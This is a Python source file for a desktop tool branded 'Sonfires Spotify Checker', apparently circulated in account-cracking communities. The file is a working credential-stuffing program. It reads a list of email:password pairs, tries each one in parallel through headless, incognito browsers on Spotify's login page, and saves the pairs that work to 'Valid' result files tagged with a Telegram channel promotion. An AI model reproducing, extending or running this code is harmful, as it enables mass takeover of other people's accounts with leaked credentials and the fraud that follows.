import os
import concurrent.futures
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import datetime
import time
from selenium import webdriver
from selenium.webdriver.common.by import By


BLACK = "#191414"
GREEN = "#1DB954"
WHITE = "#FFFFFF"
GRAY = "#B3B3B3"
BLUE = "#1ED760"

MAX_THREADS = 5
COMBO_PATH = ""
RESULTS_COMBOTYPE_FILE = ""
RESULTS_FILE = ""
URL = "https://accounts.spotify.com/es-ES/login"

webDriverOptions = webdriver.ChromeOptions()
webDriverOptions.add_argument("--headless")
webDriverOptions.add_argument("--disable-extensions")
webDriverOptions.add_argument("--incognito")
webDriverOptions.add_argument("--disable-extensions")
webDriverOptions.add_experimental_option("excludeSwitches", ["enable-logging"])

def check_account(account):
    global validCombos

    webDriver = webdriver.Chrome(options=webDriverOptions)
    webDriver.get(URL)
    webDriver.implicitly_wait(30)

    EMAIL, PASSWORD = account.split(":")
    webDriver.find_element(By.CSS_SELECTOR, "#login-username").send_keys(EMAIL)
    webDriver.find_element(By.CSS_SELECTOR, "#login-password").send_keys(PASSWORD)
    webDriver.find_element(By.CSS_SELECTOR, "#login-button").click()
    time.sleep(1.7)

    status = "INVALID"
    if webDriver.current_url == "https://accounts.spotify.com/es-ES/status" or webDriver.current_url == "https://open.spotify.com":
        status = "VALID"
        with open(RESULTS_COMBOTYPE_FILE, "a") as validCombosFile:
            validCombosFile.write(f"{EMAIL}:{PASSWORD}\n")
        with open(RESULTS_FILE, "a") as validFile:
            validFile.write(f"{EMAIL}:{PASSWORD} -> [CHECKED BY NOXIUS SPOTIFY CHECKER -> T.ME/PROJECTNOXIUS]\n")

    webDriver.close()

    return account, status

def browse_combo_file(combo_path_label):
    global COMBO_PATH
    COMBO_PATH = filedialog.askopenfilename(initialdir="/", title="Select Combo File", filetypes=[("Text Files", "*.txt")])
    combo_path_label.config(text=COMBO_PATH)

def on_start_checking():
    global RESULTS_COMBOTYPE_FILE, RESULTS_FILE

    if not COMBO_PATH:
        messagebox.showwarning("Warning", "Please select a Combo File.")
        return

    RESULTS_PATH = f"results/{datetime.datetime.now().strftime('%d-%m-%Y %H.%M.%S')}"
    if not os.path.exists(RESULTS_PATH):
        os.makedirs(RESULTS_PATH)

    RESULTS_COMBOTYPE_FILE = f"{RESULTS_PATH}/ValidCombos.txt"
    RESULTS_FILE = f"{RESULTS_PATH}/Valid.txt"

    with open(RESULTS_COMBOTYPE_FILE, "w") as validCombosFile:
        validCombosFile.write("")

    if results_table:
        results_table.delete(*results_table.get_children())

    with open(COMBO_PATH, "r") as combosFile:
        allAccounts = combosFile.readlines()
        for i in allAccounts:
            if i == "":
                allAccounts.remove(i)

    executor = concurrent.futures.ThreadPoolExecutor()
    for account in allAccounts:
        executor.submit(check_and_update_result, account.strip())
    executor.shutdown(wait=False)

def check_and_update_result(account):
    account, status = check_account(account)
    results_table.insert("", tk.END, values=(account, status))

def main():
    global results_table, root

    root = tk.Tk()
    root.title("Sonfires Spotify Checker")
    root.geometry("900x600")
    root.configure(bg=BLACK)

    main_frame = tk.Frame(root, bg=BLACK)
    main_frame.pack(fill=tk.BOTH, expand=True)

    title_label = tk.Label(main_frame, text="Sonfires Spotify Checker", font=("Arial", 24, "bold"), bg=BLACK, fg=GREEN)
    title_label.pack(pady=20)

    combo_frame = tk.Frame(main_frame, bg=BLACK)
    combo_frame.pack(pady=10)

    combo_path_label = tk.Label(combo_frame, text="Select Combo File", bg=BLACK, fg=WHITE, font=("Arial", 12))
    combo_path_label.pack(side=tk.LEFT)

    browse_button = tk.Button(combo_frame, text="Browse", command=lambda: browse_combo_file(combo_path_label), bg=GREEN, fg=BLACK, font=("Arial", 12, "bold"))
    browse_button.pack(side=tk.LEFT, padx=10)

    start_button = tk.Button(main_frame, text="Start Checking", command=on_start_checking, bg=GREEN, fg=BLACK, font=("Arial", 16, "bold"))
    start_button.pack(pady=20)

    results_table = ttk.Treeview(main_frame, columns=("Combo", "Result"), show="headings", height=15)
    results_table.heading("Combo", text="Combo", anchor=tk.CENTER)
    results_table.column("Combo", width=400, anchor=tk.CENTER)
    results_table.heading("Result", text="Result", anchor=tk.CENTER)
    results_table.column("Result", width=150, anchor=tk.CENTER)

    results_table.pack(padx=20, pady=20)


    style = ttk.Style()
    style.configure("Treeview", font=("Arial", 12), background=BLACK, foreground=WHITE, fieldbackground=BLACK, rowheight=30)
    style.map("Treeview", background=[("selected", BLUE)])

    root.mainloop()

if __name__ == "__main__":
    main()